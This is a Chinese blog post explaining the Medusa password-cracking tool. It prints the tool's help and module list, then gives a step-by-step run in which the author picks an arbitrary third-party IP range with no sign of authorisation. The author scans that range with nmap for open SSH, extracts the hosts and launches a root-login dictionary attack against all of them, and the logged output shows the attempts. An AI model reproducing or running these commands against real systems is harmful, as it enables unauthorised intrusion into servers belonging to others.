<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>medusa命令介绍 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="medusa命令介绍" />
<meta property="og:description" content="随手写一下，medusa破解起来还是比较快的，首先我们看看帮助
root@perl-exploit:/pentest/exploits/framework3# medusa
Medusa v1.5 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
ALERT: Host information must be supplied.
Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
-h [TEXT] : Target hostname or IP address
-H [FILE] : File containing target hostnames or IP addresses
-u [TEXT] : Username to test
-U [FILE] : File containing usernames to test
-p [TEXT] : Password to test" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/6c9b9365e8bb5b4722f3b13793b2bf52/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2011-10-24T14:52:36+08:00" />
<meta property="article:modified_time" content="2011-10-24T14:52:36+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">medusa命令介绍</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <span style="font-family:Verdana,Helvetica,Arial,sans-serif; color:#444444; font-size:14px; line-height:25px"></span> 
<p>随手写一下，medusa破解起来还是比较快的，首先我们看看帮助</p> 
<p>root@perl-exploit:/pentest/exploits/framework3# medusa<br> Medusa v1.5 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks</p> 
<p>ALERT: Host information must be supplied.</p> 
<p>Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]<br> -h [TEXT] : Target hostname or IP address<br> -H [FILE] : File containing target hostnames or IP addresses<br> -u [TEXT] : Username to test<br> -U [FILE] : File containing usernames to test<br> -p [TEXT] : Password to test<br> -P [FILE] : File containing passwords to test<br> -C [FILE] : File containing combo entries. See README for more information.<br> -O [FILE] : File to append log information to<br> -e [n/s/ns] : Additional password checks ([n] No Password, [s] Password = Username)<br> -M [TEXT] : Name of the module to execute (without the .mod extension)<br> -m [TEXT] : Parameter to pass to the module. This can be passed multiple times with a<br> different parameter each time and they will all be sent to the module (i.e.<br> -m Param1 -m Param2, etc.)<br> -d : Dump all known modules<br> -n [NUM] : Use for non-default TCP port number<br> -s : Enable SSL<br> -g [NUM] : Give up after trying to connect for NUM seconds (default 3)<br> -r [NUM] : Sleep NUM seconds between retry attempts (default 3)<br> -R [NUM] : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.<br> -t [NUM] : Total number of logins to be tested concurrently<br> -T [NUM] : Total number of hosts to be tested concurrently<br> -L : Parallelize logins using one username per thread. The default is to process<br> the entire username before proceeding.<br> -f : Stop scanning host after first valid username/password found.<br> -F : Stop audit after first valid username/password found on any host.<br> -b : Suppress startup banner<br> -q : Display module’s usage information<br> -v [NUM] : Verbose level [0 - 6 (more)]<br> -w [NUM] : Error debug level [0 - 10 (more)]<br> -V : Display version<br> -Z [NUM] : Resume scan from host #</p> 
<p>ok，我们看看medusa有哪些模块支持什么功能的破解</p> 
<p>root@perl-exploit:/pentest/exploits/framework3# medusa -d<br> Medusa v1.5 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks</p> 
<p>Available modules in “.” :</p> 
<p>Available modules in “/usr/lib/medusa/modules” :<br> + cvs.mod : Brute force module for CVS sessions : version 1.0.0<br> + ftp.mod : Brute force module for FTP/FTPS sessions : version 1.3.0<br> + http.mod : Brute force module for HTTP : version 1.3.0<br> + imap.mod : Brute force module for IMAP sessions : version 1.2.0<br> + mssql.mod : Brute force module for M$-SQL sessions : version 1.1.1<br> + mysql.mod : Brute force module for MySQL sessions : version 1.2<br> + ncp.mod : Brute force module for NCP sessions : version 1.0.0<br> + nntp.mod : Brute force module for NNTP sessions : version 1.0.0<br> + pcanywhere.mod : Brute force module for PcAnywhere sessions : version 1.0.2<br> + pop3.mod : Brute force module for POP3 sessions : version 1.2<br> + postgres.mod : Brute force module for PostgreSQL sessions : version 1.0.0<br> + rexec.mod : Brute force module for REXEC sessions : version 1.1.1<br> + rlogin.mod : Brute force module for RLOGIN sessions : version 1.0.2<br> + rsh.mod : Brute force module for RSH sessions : version 1.0.1<br> + smbnt.mod : Brute force module for SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 1.5<br> + smtp-vrfy.mod : Brute force module for enumerating a<a href="http://www.yunsec.net/a/security/wlgf/" rel="nofollow" style="text-decoration:none; color:rgb(102,102,102)">cc</a>ounts via SMTP VRFY : version 1.0.0<br> + smtp.mod : Brute force module for SMTP Authentication with TLS : version 1.0.0<br> + snmp.mod : Brute force module for SNMP Community Strings : version 1.0.0<br> + ssh.mod : Brute force module for SSH v2 sessions : version 1.0.2<br> + svn.mod : Brute force module for Subversion sessions : version 1.0.0<br> + telnet.mod : Brute force module for telnet sessions : version 1.2.2<br> + vmauthd.mod : Brute force module for the VMware Authentication Daemon : version 1.0.1<br> + vnc.mod : Brute force module for VNC sessions : version 1.0.1<br> + web-form.mod : Brute force module for web forms : version 1.0.0<br> + wrapper.mod : Generic Wrapper Module : version 1.0.1</p> 
<p>恩，我们要破解ssh，所以用-M ssh参数加载ssh模块，后面不用跟.mod</p> 
<p>首先我们确定目标，扫描开放ssh的机器，随便找个段扫描一下吧</p> 
<p>root@perl-exploit:/pentest# nmap -sV -p22 -oG ssh 69.163.190.0/24</p> 
<p>然后是漫长的等待，上面的参数扫描意思是，扫描整个段开了22端口的机器，并且判断服务版本，保存到ssh文件中。</p> 
<p>然后我们查看扫描结果</p> 
<p>root@perl-exploit:/pentest# cat ssh<br> # Nmap 5.00 scan initiated Tue Jun 22 02:18:28 2010 as: nmap -sV -p22 -oG ssh 69.163.190.0/24<br> Host: 69.163.190.1 (ip-69-163-190-1.dreamhost.com) Ports: 22/closed/tcp//ssh///<br> Host: 69.163.190.2 (ip-69-163-190-2.dreamhost.com) Ports: 22/closed/tcp//ssh///<br> Host: 69.163.190.3 (ip-69-163-190-3.dreamhost.com) Ports: 22/closed/tcp//ssh///<br> Host: 69.163.190.4 (dragich.shaggy.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.5 (myrck.spongebob.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.6 (apache2-twang.luthor.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.7 (ps11591.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.8 (ps10854.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.9 (rangerjill.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.10 (ouellette.yogi.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.11 (psmysql11957.dreamhostps.com) Ports: 22/open/tcp//ssh//OpenSSH 4.3p2 Debian 9etch2 (protocol 2.0)/<br> Host: 69.163.190.12 (rubeo.yogi.dreamhost.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> Host: 69.163.190.13 (alt-malware.com) Ports: 22/open/tcp//ssh//OpenSSH 5.1p1 Debian 5 (protocol 2.0)/<br> 类似这样的，这里我们要整理一下，把开了ssh的IP整理出来，现在明白oG保存的意义所在了</p> 
<p>root@perl-exploit:/pentest# grep 22/open ssh | cut -d ” ” -f 2 &gt;&gt;ssh1.txt</p> 
<p>这条命令里用到了cut，详细用法为就不罗嗦了。查看结果</p> 
<p>root@perl-exploit:/pentest# cat ssh1.txt<br> 69.163.190.4<br> 69.163.190.5<br> 69.163.190.6<br> 69.163.190.7<br> 69.163.190.8<br> 69.163.190.9<br> 69.163.190.10<br> 69.163.190.11<br> 69.163.190.12<br> 69.163.190.13<br> 69.163.190.14<br> 69.163.190.15<br> 69.163.190.16<br> 69.163.190.17<br> 69.163.190.18<br> 69.163.190.19<br> 69.163.190.22<br> 69.163.190.23<br> 69.163.190.24<br> 69.163.190.25<br> 69.163.190.26<br> 69.163.190.27<br> 69.163.190.28<br> 69.163.190.29<br> 69.163.190.30<br> 69.163.190.31<br> 69.163.190.32<br> 69.163.190.33<br> 69.163.190.34<br> 69.163.190.35<br> 69.163.190.36<br> 69.163.190.37<br> 69.163.190.38<br> 69.163.190.39<br> 69.163.190.40<br> 69.163.190.41<br> 69.163.190.42<br> 69.163.190.43<br> 69.163.190.44<br> 69.163.190.45<br> 69.163.190.46<br> 69.163.190.47<br> 69.163.190.48<br> 69.163.190.49<br> 69.163.190.50<br> 69.163.190.51<br> 69.163.190.52<br> 69.163.190.53<br> 变成这样的了，接下来，我们开始随便找个字典，开始破解ssh密码</p> 
<p>root@perl-exploit:/pentest# medusa -H ssh1.txt -u root -P p.txt -M ssh</p> 
<p>root@perl-exploit:/pentest# medusa -H ssh1.txt -u root -P p.txt -M ssh<br> Medusa v1.5 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks</p> 
<p>ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: root (1 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: admin (2 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: oracle (3 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: tomcat (4 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: postgres (5 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: webmin (6 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.4 (1 of 235, 1 complete) User: root (1 of 1, 1 complete) Password: fuckyou (7 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.5 (2 of 235, 2 complete) User: root (1 of 1, 1 complete) Password: root (1 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.5 (2 of 235, 2 complete) User: root (1 of 1, 1 complete) Password: admin (2 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.5 (2 of 235, 2 complete) User: root (1 of 1, 1 complete) Password: oracle (3 of 7 complete)<br> ACCOUNT CHECK: [ssh] Host: 69.163.190.5 (2 of 235, 2 complete) User: root (1 of 1, 1 complete) Password: tomcat (4 of 7 complete)<br> ok，等吧，这段时间你可以那啥一下，或者找个那啥片那啥一下，结果最后会自动显示。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/869e3a5da2b2d85cbac355d00cd7900d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">IIS配置相关的问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7371e8c9fbe55b22d84d6b0f3709971c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">[原创] jQuery源码分析-02正则表达式-RegExp-常用正则表达式</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>